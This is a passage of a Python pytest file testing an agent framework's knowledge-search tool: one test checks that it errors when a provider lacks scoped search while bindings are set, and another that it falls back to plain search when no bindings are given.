    async def test_knowledge_search_tool_returns_error_when_provider_lacks_bound_search(self):
        """If a provider has no search_bound_knowledge_bases but bindings are set, tool errors cleanly."""

        class LegacyProvider:
            def search(self, query: str, top_k: int):
                return []

        tool = KnowledgeSearchTool(knowledge_provider=LegacyProvider())
        context = ToolExecutionContext(
            session_id="s2",
            trace_id="t2",
            agent_key="测试",
            agent_version=1,
            knowledge_bindings=(
                KnowledgeBindingSnapshot(
                    knowledge_base_id="202", sort_order=0, config={}, config_version=1
                ),
            ),
        )

        result = await tool.execute({"query": "some query"}, context)

        assert result.status == "error"
        assert "scoped knowledge bindings" in result.error_message

    @pytest.mark.asyncio
    async def test_knowledge_search_tool_uses_fallback_search_when_bindings_absent(self):
        """When knowledge_bindings is None, tool falls back to provider.search()."""

        class FallbackProvider:
            def search(self, query: str, top_k: int):
                return [
                    KnowledgeChunk(
                        title="fallback",
                        source="legacy",
                        content="Fallback chunk content.",
                        score=0.7,
                        metadata={},
                    )
                ]

        tool = KnowledgeSearchTool(knowledge_provider=FallbackProvider())
        context = ToolExecutionContext(
            session_id="s3",
            trace_id="t3",
            agent_key="测试",
            agent_version=1,
            knowledge_bindings=None,
        )

        result = await tool.execute({"query": "what is the policy?"}, context)

        assert result.status == "success"
        assert "Fallback chunk content." in result.output
